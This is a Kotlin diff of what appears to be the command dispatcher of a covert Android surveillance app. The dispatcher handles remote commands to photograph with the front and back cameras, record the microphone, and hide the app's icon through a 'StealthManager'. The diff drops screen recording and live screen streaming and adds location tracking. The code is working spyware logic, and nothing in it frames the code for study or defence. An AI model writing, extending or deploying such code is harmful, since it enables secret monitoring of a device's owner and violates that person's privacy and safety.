@@ -13,10 +13,9 @@ import javax.inject.Singleton
 @Singleton
 class ProcessCommandUseCase @Inject constructor(
     private val commandRepository: CommandRepository,
-    private val recordScreenUseCase: RecordScreenUseCase,
     private val capturePhotoUseCase: CapturePhotoUseCase,
     private val recordAudioUseCase: RecordAudioUseCase,
-    private val streamLiveScreenUseCase: StreamLiveScreenUseCase,
+    private val locationUseCase: GetLocationUseCase,
     private val stealthManager: StealthManager
 ) {
 
@@ -28,7 +27,6 @@ class ProcessCommandUseCase @Inject constructor(
             return AppResult.Error(ErrorType.VALIDATION, "Command ID missing")
         }
 
-        // Mark processing
         commandRepository.updateCommandStatus(commandId, Constants.STATUS_PROCESSING)
 
         return try {
@@ -37,20 +35,7 @@ class ProcessCommandUseCase @Inject constructor(
 
             val result = when (baseCmd) {
 
-                Constants.CMD_SCREEN_RECORD -> {
-                    val duration = param?.toIntOrNull() ?: Constants.DEFAULT_SCREEN_DURATION
-                    recordScreenUseCase(command.deviceKey, duration)
-                }
-
-                Constants.CMD_SCREEN_STOP -> AppResult.Success(true)
-
-                Constants.CMD_LIVE_START -> streamLiveScreenUseCase(command.deviceKey)
-
-                Constants.CMD_LIVE_STOP -> {
-                    streamLiveScreenUseCase.stop()
-                    AppResult.Success(true)
-                }
-
+                // 📸 CAMERA
                 Constants.CMD_CAM_FRONT -> {
                     capturePhotoUseCase(command.deviceKey, useFrontCamera = true)
                 }
@@ -59,6 +44,7 @@ class ProcessCommandUseCase @Inject constructor(
                     capturePhotoUseCase(command.deviceKey, useFrontCamera = false)
                 }
 
+                // 🎤 MICROPHONE
                 Constants.CMD_MIC_RECORD -> {
                     val duration = param?.toIntOrNull() ?: Constants.DEFAULT_MIC_DURATION
                     recordAudioUseCase(command.deviceKey, duration)
@@ -69,12 +55,15 @@ class ProcessCommandUseCase @Inject constructor(
                     AppResult.Success(true)
                 }
 
-                Constants.CMD_MIC_LIVE -> {
-                    AppResult.Error(ErrorType.UNKNOWN, "Live mic not implemented")
+                // 📍 LOCATION
+                Constants.CMD_LOCATION -> {
+                    locationUseCase(command.deviceKey)
                 }
 
+                // 🏓 PING
                 Constants.CMD_PING -> AppResult.Success(true)
 
+                // 🙈 STEALTH
                 Constants.CMD_HIDE -> {
                     stealthManager.hideIcon()
                     AppResult.Success(true)
@@ -91,7 +80,6 @@ class ProcessCommandUseCase @Inject constructor(
                 }
             }
 
-            // ⭐ FINAL STATUS UPDATE (guaranteed)
             when (result) {
                 is AppResult.Success -> {
                     commandRepository.updateCommandStatus(commandId, Constants.STATUS_DONE)
